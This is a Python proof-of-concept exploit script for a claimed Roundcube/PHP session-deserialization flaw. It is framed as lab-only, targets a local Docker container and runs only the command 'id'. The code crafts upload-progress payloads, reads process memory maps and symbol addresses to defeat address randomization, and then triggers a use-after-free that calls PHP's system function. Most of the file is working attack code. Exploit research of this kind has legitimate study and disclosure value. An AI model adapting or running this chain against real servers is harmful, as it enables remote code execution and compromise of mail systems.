#!/usr/bin/env python3
"""LAB-ONLY CVE-2026-115560 terminal through Roundcube 1.6.11.

Server config: session.serialize_handler=php_serialize, upload_progress On,
file save handler. App: a plugin loaded in rcmail::startup() BEFORE
session_init() switches session.serialize_handler to "php". Stock Roundcube
does that in rcube_session::register_session_handler(), reached only for
db/redis/memcache storage; this lab uses session_storage='php' (native file
handler, so the upload-progress record is the record the app reads) plus the
lab plugin's top-level ini_set. See docs/ROUNDCUBE_115560.md.

The upload-progress hook writes the record with php_serialize; the "php"
decoder splits at the first "|" and feeds the bytes after it to
php_var_unserialize(). The plugin also defines CachePurge, whose __destruct()
sprays and re-enters unserialize('R:1020;') -> var_destroy UAF -> forged
zif_system -> fixed benign command "id>/tmp/vd 2>&1".

Modes: simple | measure | fire | run | len
Lab-only; targets 127.0.0.1; no arbitrary-command interface.
"""
import argparse
import importlib.util
import os
import secrets
import socket
import subprocess
import sys
import threading
import time

_HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(_HERE))


def _load(name, path):
    spec = importlib.util.spec_from_file_location(name, path)
    m = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(m)
    return m


PC = _load("vdpost", os.path.join(_HERE, "verify_vardestroy_postcarrier.py"))
VD = _load("vdmain", os.path.join(_HERE, "verify_115560_vardestroy.py"))
MAGIC = PC.MAGIC
MOFF = PC.MOFF
DOFF = PC.DOFF
OFF_ZVAL = PC.OFF_ZVAL
SESS_COOKIES = ("PHPSESSID", "roundcube_sessid")


def sh(container, cmd, timeout=90):
    return subprocess.run(["docker", "exec", container, "sh", "-c", cmd],
                          capture_output=True, text=True, timeout=timeout)


def http_upload(host, port, path, value, sid, timeout=45):
    """Binary-safe multipart upload carrying "|" + value in the progress field.

    Both cookie names are sent: the upload-progress hook runs before the script
    under the server session.name (PHPSESSID), while Roundcube renames the
    session to roundcube_sessid before session_start(). Same SID in both.
    """
    bnd = b"----rc115560"
    body = (b"--" + bnd + b"\r\n"
            b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
            b"|" + value + b"\r\n"
            b"--" + bnd + b"\r\n"
            b'Content-Disposition: form-data; name="f"; filename="x.txt"\r\n'
            b"Content-Type: text/plain\r\n\r\n"
            b"Z\r\n--" + bnd + b"--\r\n")
    req = (f"POST {path} HTTP/1.1\r\nHost: x\r\n"
           f"Cookie: PHPSESSID={sid}; roundcube_sessid={sid}\r\n"
           f"Content-Type: multipart/form-data; boundary={bnd.decode()}\r\n"
           f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode() + body
    s = socket.create_connection((host, port), timeout=timeout)
    s.sendall(req)
    s.settimeout(timeout)
    out = b""
    try:
        while True:
            d = s.recv(65536)
            if not d:
                break
            out += d
    except socket.timeout:
        pass
    s.close()
    return out


def prime(host, port, container, sid):
    dummy = PC.build_value(0, 0, b"\x00" * 8, blob_fill=b"\x00")
    try:
        http_upload(host, port, "/prime.php", dummy, sid, timeout=20)
    except OSError:
        pass


def readelf_zif(container, lib_base):
    r = sh(container, "readelf -sW /usr/lib/apache2/modules/libphp.so "
                      "| grep -E ' zif_system$' | head -1")
    for line in r.stdout.splitlines():
        parts = line.split()
        if parts and parts[-1] == "zif_system":
            return lib_base + int(parts[1], 16)
    return 0


def session_dump(container, sid):
    r = subprocess.run(["docker", "exec", container, "sh", "-c",
                        f"cat /tmp/sessions/sess_{sid} 2>/dev/null | head -c 600"],
                       capture_output=True, timeout=30)
    return r.stdout[:600]


def measure(host, port, container, sid, measure_mode="5", spray=3048):
    """Return (main, delta, lib, zif, carrier) for the session-value string."""
    sh(container, "rm -f /tmp/meas_pid /tmp/vd /tmp/rc-vd.log")
    val = bytearray(PC.build_value(0, 0, b"\x00" * 8, blob_fill=b"\x00"))
    val[DOFF + MOFF:DOFF + MOFF + len(MAGIC) * 2] = MAGIC * 2
    payload = VD.force_fail(bytes(val))

    prime(host, port, container, sid)
    th = {}
    t = threading.Thread(target=lambda: th.setdefault(
        "r", http_upload(host, port,
                         f"/index.php?m={measure_mode}&s={spray}", payload, sid)),
        daemon=True)
    t.start()

    pid = 0
    for _ in range(80):
        pid = int(sh(container, "cat /tmp/meas_pid 2>/dev/null").stdout.strip() or 0)
        if pid:
            break
        time.sleep(0.1)
    if not pid:
        print("[!] measure dtor did not run (no /tmp/meas_pid)")
        print("    log: " + sh(container, "tail -5 /tmp/rc-vd.log 2>/dev/null").stdout.strip())
        return None

    maps_text = sh(container, f"cat /proc/{pid}/maps").stdout
    from php2shell import maps  # noqa: E402
    lib, mains = maps.parse_maps(maps_text)
    if not lib or not mains:
        print(f"[!] maps parse failed (lib={lib} mains={mains})")
        return None
    main = mains[0]
    zif = readelf_zif(container, lib)
    if not zif:
        print("[!] zif_system symbol not found")
        return None

    scan = sh(container, f"php /var/www/html/scan_prefix.php {pid} "
                         f"{(MAGIC * 2).hex()} {MOFF} {DOFF} {len(PC.PREFIX)}")
    hits = []
    for line in scan.stdout.splitlines():
        parts = line.split()
        if len(parts) < 3 or not parts[0].startswith("0x"):
            continue
        try:
            h = int(parts[0], 16)
            v = int(parts[1].split("=", 1)[1], 16)
        except (ValueError, IndexError):
            continue
        pref = parts[2].split("=", 1)[1] if "=" in parts[2] else ""
        pre17 = parts[3].split("=", 1)[1] if len(parts) > 3 and "=" in parts[3] else ""
        pre64 = parts[4].split("=", 1)[1] if len(parts) > 4 and "=" in parts[4] else ""
        hits.append((h, v, pref, pre17, pre64))
    if not hits:
        print(f"[!] magic scan failed: {scan.stdout.strip()} {scan.stderr.strip()}")
        return None
    want = PC.PREFIX.hex()
    raw = [x for x in hits if x[2] == want]
    # Session-file read buffers carry "upload_progress_|" immediately before
    # the payload. The request-body copy does not. The lowest-address read
    # buffer is released before the real dtor; the persistent copies are the
    # higher-address ones (empirically 2 of 3 fire, the last one reliably).
    KEYPRE = b"upload_progress_|".hex()
    sessbuf = [x for x in raw if x[3] == KEYPRE]
    print(f"[m] magic hits={len(hits)} raw-input={len(raw)} "
          f"session-buffer={len(sessbuf)}")
    for h, v, p, p17, p64 in raw:
        tail = bytes.fromhex(p64) if p64 else b""
        print(f"[m]   hit={h:#x} vstart={v:#x} delta={v-main:#x} "
              f"sessbuf={p17 == KEYPRE} pre64_tail={tail[-40:]!r}")
    if sessbuf:
        magic_addr, value_string, _, _, _ = max(sessbuf, key=lambda x: x[1])
        print("[m] carrier candidate = highest-address session buffer")
    elif raw:
        magic_addr, value_string, _, _, _ = raw[0]
        print("[!] no hit carried the raw-input PREFIX; using first hit")
    else:
        magic_addr, value_string, _, _, _ = hits[0]
        print("[!] no PREFIX hit at all; using first hit")
    carrier = value_string + DOFF
    delta = value_string - main

    print(f"[m] pid={pid} main={main:#x} lib={lib:#x} zif={zif:#x}")
    print(f"[m] magic={magic_addr:#x} carrier={carrier:#x} "
          f"value_string={value_string:#x} delta={delta:#x}")
    sh(container, f"kill -9 {pid} 2>/dev/null")
    t.join(timeout=5)
    time.sleep(0.8)
    return main, delta, lib, zif, carrier


def fire(host, port, container, sid, main, delta, zif, bias=0,
         fire_mode="4", ref=1020, spray=3048, noswitch=False, nogadget=False):
    carrier = main + delta + DOFF
    key = (carrier + OFF_ZVAL).to_bytes(8, "little")
    payload = VD.force_fail(PC.build_value(carrier, zif + bias, key,
                                           blob_fill=b"\x00"))
    sh(container, "rm -f /tmp/vd /tmp/meas_pid")
    if noswitch:
        sh(container, "touch /tmp/rc-vd-noswitch")
    if nogadget:
        sh(container, "touch /tmp/rc-vd-nogadget")
    prime(host, port, container, sid)
    resp = http_upload(host, port,
                       f"/index.php?m={fire_mode}&r={ref}&s={spray}", payload, sid)
    time.sleep(0.8)
    out = sh(container, f"cat /tmp/vd 2>/dev/null").stdout
    if noswitch or nogadget:
        sh(container, "rm -f /tmp/rc-vd-noswitch /tmp/rc-vd-nogadget")
    status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace") if resp else "<none>"
    print(f"[f] response={status} proof={out.strip()!r}")
    return "uid=" in out


def simple(host, port, container, sid):
    payload = b'O:8:"VdSimple":0:{}'
    sh(container, "rm -f /tmp/vd /tmp/rc-vd.log")
    resp = http_upload(host, port, "/index.php", payload, sid)
    time.sleep(0.5)
    out = sh(container, "cat /tmp/vd 2>/dev/null").stdout
    log = sh(container, "cat /tmp/rc-vd.log 2>/dev/null").stdout
    status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace") if resp else "<none>"
    print(f"[s] response={status} proof={out.strip()!r}")
    print("[s] plugin log:\n" + log.strip())
    return "uid=" in out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="127.0.0.1:18310")
    ap.add_argument("--container", default="php2shell-rc-8427")
    ap.add_argument("--build", default="8.4.27")
    ap.add_argument("--sid", default=None)
    ap.add_argument("--bias-zif", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--proof", default="/tmp/vd")
    ap.add_argument("--measure-mode", default="5", choices=["0", "2", "5"])
    ap.add_argument("--fire-mode", default="4", choices=["1", "4"])
    ap.add_argument("--main", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--delta", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--lib", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--zif", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--ref", type=int, default=1020)
    ap.add_argument("--spray", type=int, default=None)
    ap.add_argument("--noswitch", action="store_true",
                    help="control: skip the plugin's runtime handler switch")
    ap.add_argument("--nogadget", action="store_true",
                    help="control: do not define VdSimple/CachePurge")
    ap.add_argument("--show-session", action="store_true")
    ap.add_argument("mode", nargs="?", default="run",
                    choices=["simple", "prime", "measure", "fire", "run", "len"])
    args = ap.parse_args()

    host, _, port = args.target.partition(":")
    port = int(port or 80)
    spray = args.spray if args.spray is not None else (
        8135 if args.build.startswith("8.5") else 3048)
    sid = args.sid or secrets.token_hex(16)
    print(f"[*] Roundcube 115560 terminal ({args.build})")
    print(f"    target {args.target} container {args.container} spray {spray}")

    if args.mode == "len":
        print(f"value_len={PC.final_len():#x} DOFF={DOFF:#x}")
        return 0
    if args.mode == "simple":
        return 0 if simple(host, port, args.container, sid) else 1
    if args.mode == "prime":
        prime(host, port, args.container, sid)
        print(f"[p] sess_{sid}: " + repr(session_dump(args.container, sid)))
        return 0

    main_addr, delta, lib, zif = args.main, args.delta, args.lib, args.zif
    fire_mode = args.fire_mode
    if args.mode in ("measure", "run"):
        measure_sid = args.sid or secrets.token_hex(16)
        res = measure(host, port, args.container, measure_sid,
                      args.measure_mode, spray)
        if not res and args.measure_mode == "5" and args.fire_mode == "4":
            print("[i] no second var_destroy dtor (8.5.x shape); "
                  "falling back to the single mid-parse dtor")
            res = measure(host, port, args.container, secrets.token_hex(16),
                          "0", spray)
            fire_mode = "1"
        if not res:
            return 2
        main_addr, delta, lib, zif, _carrier = res

    # Fire uses a fresh SID: the measured delta is for a two-record file
    # (prime dummy + one payload). Reusing the measure SID would add a third
    # record and move the carrier.
    fire_sid = args.sid or secrets.token_hex(16)

    if args.mode == "measure":
        if args.show_session:
            print("[sess] " + repr(session_dump(args.container, measure_sid)))
        return 0
    if main_addr is None or delta is None:
        print("[!] fire needs --main and --delta (or 'run' to measure)")
        return 2
    if not zif:
        if not lib:
            print("[!] fire needs --zif or --lib")
            return 2
        zif = readelf_zif(args.container, lib)
        if not zif:
            print("[!] zif_system symbol not found")
            return 2
    if args.bias_zif:
        print(f"    [!] BIAS zif by {args.bias_zif:#x} (control: must not fire)")
    if fire(host, port, args.container, fire_sid, main_addr, delta, zif,
            args.bias_zif, fire_mode, args.ref, spray,
            args.noswitch, args.nogadget):
        print("[EVIDENCE] Roundcube 115560 session decode -> var_destroy -> uid=33")
        return 0
    print("[!] no proof written")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
